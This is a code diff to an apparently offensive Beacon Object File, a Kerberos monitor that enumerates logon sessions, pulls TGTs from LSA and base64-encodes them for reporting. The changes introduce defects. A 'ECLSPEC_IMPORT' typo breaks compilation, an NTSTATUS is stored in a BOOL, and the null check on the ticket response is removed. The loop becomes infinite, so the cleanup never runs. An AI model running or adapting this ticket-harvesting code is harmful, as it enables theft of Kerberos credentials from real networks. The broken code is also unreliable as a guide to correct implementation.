@@ -7,10 +7,7 @@ void printoutput(BOOL done);
 #include <ntsecapi.h>
 #include <ntstatus.h>
 
-// -----------------------------------------------------------------------
-// LSA imports — declarados directamente, sin functions.c
-// -----------------------------------------------------------------------
-DECLSPEC_IMPORT NTSTATUS WINAPI SECUR32$LsaRegisterLogonProcess(PLSA_STRING LogonProcessName, PHANDLE LsaHandle, PLSA_OPERATIONAL_MODE SecurityMode);
+ECLSPEC_IMPORT NTSTATUS WINAPI SECUR32$LsaRegisterLogonProcess(PLSA_STRING LogonProcessName, PHANDLE LsaHandle, PLSA_OPERATIONAL_MODE SecurityMode);
 DECLSPEC_IMPORT NTSTATUS WINAPI SECUR32$LsaGetLogonSessionData(PLUID LogonId, PSECURITY_LOGON_SESSION_DATA* ppLogonSessionData);
 DECLSPEC_IMPORT NTSTATUS WINAPI SECUR32$LsaEnumerateLogonSessions(PULONG LogonSessionCount, PLUID* LogonSessionList);
 DECLSPEC_IMPORT NTSTATUS WINAPI SECUR32$LsaFreeReturnBuffer(PVOID Buffer);
@@ -130,9 +127,6 @@ static char* b64_encode(BYTE* input, size_t input_len) {
     return (char*)out;
 }
 
-// -----------------------------------------------------------------------
-// IsSystem / GetCurrentToken / GetLsaHandle
-// -----------------------------------------------------------------------
 static BOOL IsSystem(void) {
     HANDLE hToken = NULL;
     UCHAR bTokenUser[sizeof(TOKEN_USER) + 8 + 4 * SID_MAX_SUB_AUTHORITIES];
@@ -193,14 +187,14 @@ static BOOL ExtractTicket(HANDLE hLsa, ULONG authPackage, LUID luid,
     KERB_RETRIEVE_TKT_RESPONSE* resp = NULL;
     ULONG respSize = reqSize;
     NTSTATUS protStatus;
-    NTSTATUS status = SECUR32$LsaCallAuthenticationPackage(
+    BOOL status = SECUR32$LsaCallAuthenticationPackage(
         hLsa, authPackage, req, reqSize,
         (PVOID*)&resp, &respSize, &protStatus);
 
     intFree(req);
 
     BOOL ok = FALSE;
-    if (status == 0 && protStatus == 0 && resp && respSize > 0) {
+    if (!status && !protStatus && respSize > 0) {
         ULONG sz = resp->Ticket.EncodedTicketSize;
         *ticket = (BYTE*)intAlloc(sz);
         if (*ticket) {
@@ -213,9 +207,6 @@ static BOOL ExtractTicket(HANDLE hLsa, ULONG authPackage, LUID luid,
     return ok;
 }
 
-// -----------------------------------------------------------------------
-// ScanAndReport — un solo scan, retorna inmediatamente
-// -----------------------------------------------------------------------
 static void ScanAndReport(HANDLE hLsa, ULONG authPackage, BOOL highIntegrity,
                           TICKET_SNAPSHOT* snap, BOOL firstRun) {
     ULONG sessionCount = 0;
@@ -306,24 +297,18 @@ void go(char* args, int len) {
     datap parser;
     BeaconDataParse(&parser, args, len);
 
-    // Params vienen como una sola cstr: "/interval:5 /runtime:1800"
     int param_len = 0;
     char* params = BeaconDataExtract(&parser, &param_len);
 
     int intervalSec = 30;
-    int runtimeSec  = 300;
 
-    // Parsear /interval: y /runtime: del string de params
+    // Parsear /interval:
     if (params && param_len > 0) {
         char* p = params;
         while (*p) {
             if (my_strncmp_local(p, "/interval:", 10) == 0) {
                 intervalSec = (int)my_strtol(p + 10, 10);
                 if (intervalSec <= 0) intervalSec = 30;
-            }
-            if (my_strncmp_local(p, "/runtime:", 9) == 0) {
-                runtimeSec = (int)my_strtol(p + 9, 10);
-                if (runtimeSec <= 0) runtimeSec = 300;
             }
             p++;
         }
@@ -351,7 +336,6 @@ void go(char* args, int len) {
 
     internal_printf("\n[*] Kerberos Monitor started\n");
     internal_printf("    Interval : %d sec\n", intervalSec);
-    internal_printf("    Runtime  : %d sec\n", runtimeSec);
     internal_printf("    Watching for new TGTs...\n\n");
     printoutput(FALSE);
 
@@ -370,17 +354,11 @@ void go(char* args, int len) {
     ScanAndReport(hLsa, authPackage, highIntegrity, snap, TRUE);
 
     DWORD intervalMs = (DWORD)intervalSec * 1000;
-    DWORD runtimeMs  = (DWORD)runtimeSec  * 1000;
-    DWORD elapsed    = 0;
 
-    while (elapsed < runtimeMs) {
+    while (1) {
         KERNEL32$Sleep(intervalMs);
-        elapsed += intervalMs;
         ScanAndReport(hLsa, authPackage, highIntegrity, snap, FALSE);
     }
-
-    internal_printf("[*] Monitor finished after %d seconds\n", runtimeSec);
-    printoutput(TRUE);
 
     intFree(snap);
     SECUR32$LsaDeregisterLogonProcess(hLsa);
